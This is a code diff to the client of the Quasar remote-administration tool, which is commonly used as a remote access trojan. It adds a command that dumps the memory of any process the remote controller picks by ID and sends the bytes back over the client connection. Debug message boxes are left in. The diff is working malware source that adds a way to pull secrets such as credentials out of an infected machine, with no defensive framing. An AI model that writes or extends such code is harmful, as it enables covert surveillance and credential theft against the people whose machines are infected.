@@ -1,5 +1,6 @@
 ﻿using Quasar.Client.Networking;
 using Quasar.Client.Setup;
+using Quasar.Client.Helper;
 using Quasar.Common;
 using Quasar.Common.Enums;
 using Quasar.Common.Helpers;
@@ -14,6 +15,8 @@ using System.IO;
 using System.Net;
 using System.Reflection;
 using System.Threading;
+
+using System.Windows.Forms;
 
 namespace Quasar.Client.Messages
 {
@@ -45,7 +48,8 @@ namespace Quasar.Client.Messages
 
         public bool CanExecute(IMessage message) => message is GetProcesses ||
                                                              message is DoProcessStart ||
-                                                             message is DoProcessEnd;
+                                                             message is DoProcessEnd ||
+                                                             message is DoProcessDump;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -60,6 +64,9 @@ namespace Quasar.Client.Messages
                     Execute(sender, msg);
                     break;
                 case DoProcessEnd msg:
+                    Execute(sender, msg);
+                    break;
+                case DoProcessDump msg:
                     Execute(sender, msg);
                     break;
             }
@@ -208,6 +215,21 @@ namespace Quasar.Client.Messages
             {
                 client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
             }
+        }
+
+        private void Execute(ISender client, DoProcessDump message)
+        {
+            byte[] dump = DumpHelper.GetProcessDump(message.Pid);
+            MessageBox.Show($"Received Dump: {dump.Length} bytes");
+            if (dump.Length > 0)
+            {
+                // Could add a zip here later (idk how big a dump will be)
+                MessageBox.Show("Sending Dump!");
+                client.Send(new DoProcessDumpResponse { Memory = dump, Result = true });
+                return;
+            }
+            MessageBox.Show("Sending Failure!");
+            client.Send(new DoProcessDumpResponse { Memory = new byte[] { }, Result = false });
         }
 
         /// <summary>
